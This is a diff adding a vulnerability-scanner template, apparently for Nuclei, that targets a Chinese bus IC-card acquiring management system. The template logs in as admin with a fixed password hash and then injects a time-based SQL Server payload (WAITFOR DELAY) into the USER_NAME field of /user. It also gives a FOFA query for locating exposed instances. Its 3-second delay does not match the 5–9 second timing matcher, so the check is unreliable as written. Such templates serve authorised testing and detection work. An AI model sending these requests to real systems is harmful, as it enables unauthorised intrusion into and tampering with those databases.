@@ -1,0 +1,43 @@
+id: bus-ic-user-sqli
+info:
+  name: 公交 IC 卡收单管理系统 user - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 公交IC卡收单管理系统user存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fuser%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="公交IC卡收单管理系统"
+    hunter-query: demo
+  tags: bus-ic,sqli,time
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=admin&password=e10adc3949ba59abbe56e057f20f883e
+
+      - |+
+        @timeout: 15s
+        POST /user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        _search=false&nd=1727245865182&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=1');WAITFOR DELAY '0:0:3'--&REAL_NAME=1&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - duration_2 >= 5 && duration_2 < 9
+          - contains_all(body_2,'pageCount','pageNo','row')
+        condition: and
